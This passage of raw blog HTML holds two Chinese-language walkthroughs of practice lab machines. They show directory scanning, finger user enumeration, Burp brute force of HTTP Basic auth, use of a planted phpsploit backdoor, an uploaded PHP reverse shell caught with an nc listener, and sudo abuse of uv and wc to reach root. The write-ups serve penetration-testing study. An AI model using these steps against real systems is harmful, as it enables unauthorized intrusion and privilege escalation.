bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.25 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md,db,js<br>...<br>/.html                (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 14134]<br>/.php                 (Status: 403) [Size: 277]<br>/users.html           (Status: 200) [Size: 2052]<br>/robots.txt           (Status: 200) [Size: 35]<br>/terminal             (Status: 401) [Size: 459]<br>...<br></code></pre></td></tr></table></figure><p><code>users.html</code>应该是一个用户字典<br>同时查看页面源码发现有提示<code>&lt;!-- top1000 passwd --&gt;</code>，应该需要进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aa ab ac ad ae af ag ah ai aj ak al am an ao ap aq ar as at au av aw ax ay az ba bb bc bd be bf <span class="hljs-built_in">bg</span> bh bi bj bk bl bm bn bo bp bq br bs bt bu bv bw bx by bz ca cb cc <span class="hljs-built_in">cd</span> ce cf cg ch ci cj ck cl cm cn co <span class="hljs-built_in">cp</span> cq cr cs ct cu cv cw cx cy cz da db dc <span class="hljs-built_in">dd</span> de <span class="hljs-built_in">df</span> dg dh di dj dk dl dm dn <span class="hljs-keyword">do</span> dp dq dr ds dt <span class="hljs-built_in">du</span> dv dw dx dy dz ea eb ec ed ee ef eg eh ei ej ek el em en eo ep eq er es et eu ev ew ex ey ez fa fb <span class="hljs-built_in">fc</span> fd fe ff <span class="hljs-built_in">fg</span> fh <span class="hljs-keyword">fi</span> fj fk fl fm fn fo fp fq fr fs ft fu fv fw fx fy fz ga gb gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic <span class="hljs-built_in">id</span> ie <span class="hljs-keyword">if</span> ig ih ii ij ik il im <span class="hljs-keyword">in</span> io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm <span class="hljs-built_in">ln</span> lo lp lq lr <span class="hljs-built_in">ls</span> lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu <span class="hljs-built_in">mv</span> mw mx my mz na nb nc nd ne nf ng nh ni nj nk <span class="hljs-built_in">nl</span> nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc <span class="hljs-built_in">od</span> oe of og oh oi oj ok ol om on oo op oq or os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl pm pn po pp pq <span class="hljs-built_in">pr</span> ps pt pu pv pw px py pz qa qb qc qd qe qf qg qh qi qj qk ql qm qn qo qp qq qr qs qt qu qv qw qx qy qz ra rb rc rd re rf rg rh ri rj rk rl <span class="hljs-built_in">rm</span> rn ro rp rq rr rs rt ru rv rw rx ry rz sa sb sc sd se sf sg sh si sj sk sl sm sn so sp sq sr ss st su sv sw sx sy sz ta tb tc td te tf tg th ti tj tk tl tm tn to tp tq <span class="hljs-built_in">tr</span> ts tt tu tv tw tx ty tz ua ub uc ud ue uf ug uh ui uj uk ul um un uo up uq ur us ut uu uv uw ux uy uz va vb vc vd ve vf vg vh vi vj vk vl vm vn vo vp vq vr vs vt vu vv vw vx vy vz wa wb <span class="hljs-built_in">wc</span> wd we wf wg wh wi wj wk wl wm wn wo wp wq wr ws wt wu wv ww wx wy wz xa xb xc xd xe xf xg xh xi xj xk xl xm xn xo xp xq xr xs xt xu xv xw xx xy xz ya yb yc yd ye yf yg yh yi yj yk yl ym yn yo yp yq yr ys yt yu yv yw yx yy yz za zb zc zd ze zf zg zh zi zj zk zl zm zn zo zp zq zr zs zt zu zv zw zx zy zz<br></code></pre></td></tr></table></figure><p><code>terminal</code>需要进行用户认证登录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512151128076.png"></p><h2 id="2、finger用户枚举"><a href="#2、finger用户枚举" class="headerlink" title="2、finger用户枚举"></a>2、finger用户枚举</h2><p><code>finger</code>用户枚举工具：<a href="https://github.com/dev-angelist/Finger-User-Enumeration#">https://github.com/dev-angelist/Finger-User-Enumeration#</a><br>需要对代码进行修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_valid_user</span>(<span class="hljs-params">output</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Function to check if the user is valid by analyzing the output.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;no such user.&quot;</span> <span class="hljs-keyword">in</span> output:<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>    <span class="hljs-comment">#if &quot;Login&quot; in output and &quot;Name&quot; in output and &quot;Super-User&quot; in output:</span><br>    <span class="hljs-comment">#    return True</span><br>    <span class="hljs-comment">#if &quot;ssh&quot; in output:</span><br>    <span class="hljs-comment">#    return True</span><br>    <span class="hljs-comment">#return False</span><br></code></pre></td></tr></table></figure><p>对<code>finger</code>用户进行枚举</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/vulnyx/fing/Finger-User-Enumeration]<br>└─# python3 finger_user_enumeration.py -t 192.168.2.25 -w ../user.txt<br><br>  /  Starting finger-user-enum v1.0 by @dev-angelist<br> /  https://github.com/dev-angelist/Finger-User-Enumeration<br>/  Scanning target: 192.168.2.25 on port 79 <span class="hljs-keyword">for</span> 42 usernames at: 2025-12-15 11:09:41<br>====================================================================================<br><br>[+] User found: dt@192.168.2.25<br>[+] User found: lp@192.168.2.25<br><br>[!] 2 Users Found<br></code></pre></td></tr></table></figure><p>发现两个用户<code>dt</code>和<code>lp</code>，经过查看返回的信息，确定最终的用户为<code>dt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# finger lp@192.168.2.25         <br><br>Welcome to Linux version 4.19.0-27-amd64 at GameShell2 !<br><br> 03:41:06 up 5 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00<br><br>Login: lp                               Name: lp<br>Directory: /var/spool/lpd               Shell: /usr/sbin/nologin<br>Never logged <span class="hljs-keyword">in</span>.<br>No mail.<br>No Plan.<br><br>┌──(root㉿kali)-[/miaosec]<br>└─# finger dt@192.168.2.25<br><br>Welcome to Linux version 4.19.0-27-amd64 at GameShell2 !<br><br> 03:41:10 up 5 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00<br><br>Login: dt                               Name: <br>Directory: /home/dt                     Shell: /bin/bash<br>Never logged <span class="hljs-keyword">in</span>.<br>No mail.<br>No Plan.<br></code></pre></td></tr></table></figure><h2 id="3、HTTP认证爆破"><a href="#3、HTTP认证爆破" class="headerlink" title="3、HTTP认证爆破"></a>3、HTTP认证爆破</h2><p>使用burpsuite进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /terminal HTTP/1.1<br>Host: 192.168.2.25<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>Priority: u=0, i<br>Authorization: Basic ZHQ6MTIzNDU2 //解密为dt:123456<br></code></pre></td></tr></table></figure><p>根据格式进行密码设置</p><ol><li>使用<code>Intruder</code>爆破，<code>Sniper attack</code>模式</li><li><code>Payloads</code>设置，<code>Payload type</code>为<code>Custom iterator</code><ol><li><code>Postion1</code>为<code>dt</code></li><li><code>Postion1</code>为<code>:</code></li><li><code>Postion3</code>为密码</li></ol></li><li>设置加密模式，<code>Payload processing</code>为<code>Base64-encode</code></li></ol><p>最后成功解密出密码为<code>ZHQ6cHVycGxlMQ%3d=</code>，解密为<code>dt:purple1</code>，密码为<code>purple1</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512151649228.png"></p><p>登录成功后，发现是一个贪吃蛇的游戏，要求达到15分，手动运行一下，发现没有任何结果，经过抓包发现<code>Your pass is: 0t4tdtlt</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512151707035.png"></p><h1 id="三、获取dt权限"><a href="#三、获取dt权限" class="headerlink" title="三、获取dt权限"></a>三、获取dt权限</h1><p>使用凭证<code>dt:0t4tdtlt</code>进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh dt@192.168.2.25        <br>dt@GameShell2:~$ <span class="hljs-built_in">id</span><br>uid=1000(dt) gid=1000(dt) <span class="hljs-built_in">groups</span>=1000(dt)<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取www-data权限"><a href="#1、获取www-data权限" class="headerlink" title="1、获取www-data权限"></a>1、获取www-data权限</h2><p>发现很多命令都无法使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">dt@GameShell2:~$ <span class="hljs-built_in">sudo</span> -l<br>Error: <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">command</span> is restricted -l<br>dt@GameShell2:~$ <span class="hljs-built_in">cd</span> /<br>Error: <span class="hljs-built_in">cd</span> <span class="hljs-built_in">command</span> is restricted /<br></code></pre></td></tr></table></figure><p>查看<code>/home/dt</code>目录，发现一个<code>phpsploit</code>目录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512151755329.png"></p><p>找到工具链接，发现是一个后门工具<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512151756309.png"></p><p>同时找到一个域名<code>dev.astra.dsz</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">dt@GameShell2:~$ <span class="hljs-built_in">ls</span> -la /etc/apache2/sites-enabled/<br>total 8<br>drwxr-xr-x 2 root root 4096 Nov 21 03:06 .<br>drwxr-xr-x 8 root root 4096 Nov 21 03:28 ..<br>lrwxrwxrwx 1 root root   35 Apr  1  2025 000-default.conf -&gt; ../sites-available/000-default.conf<br>lrwxrwxrwx 1 root root   37 Nov 21 03:05 dev.astra.dsz.conf -&gt; ../sites-available/dev.astra.dsz.conf<br></code></pre></td></tr></table></figure><p>进行目录扫描，发现一个文件<code>backdoor.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://dev.astra.dsz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md,db,js<br>...<br>/.html                (Status: 403) [Size: 278]<br>/.php                 (Status: 403) [Size: 278]<br>/index.html           (Status: 200) [Size: 68]<br>/backdoor.php         (Status: 200) [Size: 0]<br>...<br></code></pre></td></tr></table></figure><p>使用<code>phpsploit</code>进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">phpsploit &gt; <span class="hljs-built_in">set</span> TRAGET dev.astra.dsz/backdooor.php<br>phpsploit &gt; exploit<br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>查看sudo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Matching Defaults entries <span class="hljs-keyword">for</span> www-data on GameShell2:<br><span class="hljs-built_in">env</span> reset,mail badpass,<br>secure path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User www-data may run the following commands on GameShell2:<br>(ALL)NOPASSWD: /usr/local/bin/uv<br></code></pre></td></tr></table></figure><p><code>/usr/local/bin/uv</code>提权，可以直接运行shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Gameshell2:/var/www$ suudo /usr/local/bin/uv run /bin/bash<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>finger</tag>
      
      <tag>HTTP认证爆破</tag>
      
      <tag>phpsploit</tag>
      
      <tag>sudo-uv</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Baby</title>
    <link href="/Maze-sec/Baby/"/>
    <url>/Maze-sec/Baby/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-16 09:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00069s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00059s latency).<br>MAC Address: 08:00:27:59:EA:A8 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.21<br>Host is up (0.0013s latency).<br>MAC Address: 08:00:27:67:2B:0B (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.19 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.21</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.21                                 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-16 09:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.21<br>Host is up (0.00044s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:67:2B:0B (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.71 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22</code>和<code>80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.21<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-16 09:11 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.21<br>Host is up (0.0013s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="hljs-string">MAC Address: 08:00:27:67:2B:0B (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 9.29 seconds</span><br></code></pre></td></tr></table></figure><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.21                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-16 09:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.21<br>Host is up (0.00091s latency).<br>All 100 scanned ports on 192.168.2.21 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 54 closed udp ports (port-unreach), 46 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:67:2B:0B (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 48.69 seconds<br></code></pre></td></tr></table></figure><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><p>访问80端口，发现是一个文件上传<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512161025481.png"></p><p>尝试上传shell脚本，成功上传<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512161026850.png"></p><h1 id="三、获取www-data权限"><a href="#三、获取www-data权限" class="headerlink" title="三、获取www-data权限"></a>三、获取www-data权限</h1><p>访问<code>rev.php</code>，成功获取到<code>www-data</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tools]<br>└─# nc -lvnp 4444          <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.21] 53386<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p>稳定shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br>ctrl+z<br><span class="hljs-built_in">stty</span> row -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br>reset xterm<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取aaa权限"><a href="#1、获取aaa权限" class="headerlink" title="1、获取aaa权限"></a>1、获取aaa权限</h2><p>查看<code>/etc/passwd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Baby:/var/www/html$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>....<br>welcome:x:1000:1000:,,,:/home/welcome:/bin/bash<br>aaa:x:1001:1001:pa**wd -&gt; root:/home/aaa:/bin/bash<br>bbb:x:1002:1002:,,,:/home/bbb:/bin/bash<br>ccc:x:1003:1003:,,,:/home/ccc:/bin/bash<br></code></pre></td></tr></table></figure><p>发现<code>pa**wd -&gt; root</code>，提示password密码为<code>root</code>，切换到用户aaa</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Baby:/var/www/html$ su aaa<br>Password: <br>aaa@Baby:/var/www/html$ <span class="hljs-built_in">id</span><br>uid=1001(aaa) gid=1001(aaa) <span class="hljs-built_in">groups</span>=1001(aaa)<br></code></pre></td></tr></table></figure><p>查看<code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">aaa@Baby:/$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> aaa on Baby:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User aaa may run the following commands on Baby:<br>    (ALL) NOPASSWD: /usr/bin/wc<br></code></pre></td></tr></table></figure><p>可以无<code>root</code>密码使用<code>/usr/bin/wc</code></p><p><code>/usr/bin/wc</code>可以读取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_read<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">wc</span> --files0-from <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span><br></code></pre></td></tr></table></figure><h2 id="2、获取ccc权限"><a href="#2、获取ccc权限" class="headerlink" title="2、获取ccc权限"></a>2、获取ccc权限</h2><p>尝试使用<code>root</code>密码进行登录，成功切换到<code>ccc</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">aaa@Baby:/$ su ccc<br>Password: <br>ccc@Baby:/$ <span class="hljs-built_in">id</span><br>uid=1003(ccc) gid=1003(ccc) <span class="hljs-built_in">groups</span>=1003(ccc)<br></code></pre></td></tr></table></figure><p>查看<code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">ccc@Baby:/$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> ccc on Baby:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User ccc may run the following commands on Baby:<br>    (ALL) NOPASSWD: /opt/ccc.sh<br></code></pre></td></tr></table></figure><p>可以使用<code>root</code>权限执行<code>/opt/ccc.sh</code></p><h2 id="3、获取root权限"><a href="#3、获取root权限" class="headerlink" title="3、获取root权限"></a>3、获取root权限</h2><p>在<code>aaa</code>用户的权限下，使用<code>/usr/bin/wc</code>查看<code>/opt/ccc.sh</code>的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aaa@Baby:/$ <span class="hljs-built_in">sudo</span> /usr/bin/wc --files0-from /opt/ccc.sh<br>/usr/bin/wc: <span class="hljs-string">&#x27;#!/bin/bash&#x27;</span>$<span class="hljs-string">&#x27;\n\n&#x27;</span><span class="hljs-string">&#x27;cp /home/ccc/.ssh/id_rsa.pub /root/.ssh/authorized_keys&#x27;</span>$<span class="hljs-string">&#x27;\n&#x27;</span>: No such file or directory<br></code></pre></td></tr></table></figure><p>执行命令，将<code>/home/ccc</code>下面的公钥复制到<code>root</code>用户下，那么我们可以创建一个私钥，将私钥复制到root用户下</p><p>在<code>ccc</code>用户的权限下，创建私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 